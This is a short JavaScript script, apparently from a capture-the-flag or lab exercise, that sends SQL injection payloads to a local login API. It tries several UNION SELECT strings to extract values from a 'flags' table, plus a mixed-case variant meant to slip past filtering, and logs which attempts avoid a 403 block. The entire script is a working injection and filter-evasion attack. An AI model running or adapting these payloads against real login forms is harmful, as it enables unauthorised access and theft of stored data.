const bypassLogin = async (payload) => {
    const res = await fetch('http://localhost:4000/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: payload, password: "123" })
      });
    if (res.status !== 403) {
      console.log(`[SUCCESS LOGIN] Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED LOGIN] Payload: ${payload}`);
    }
}

const run = async () => {
    await bypassLogin("admin' UNION SELECT 1, flag_value, 'dummy', 'dummy' FROM flags/*");
    await bypassLogin("a' UNION SELECT 1, flag_value, 'dummy', 'dummy' FROM flags/*");
    await bypassLogin("a' UNION SELECT 1, flag_value FROM flags/*");
    // maybe case variation
    await bypassLogin("a' uNiOn sElEcT 1, flag_value, 'dummy', 'dummy' FROM flags/*");
};

run();
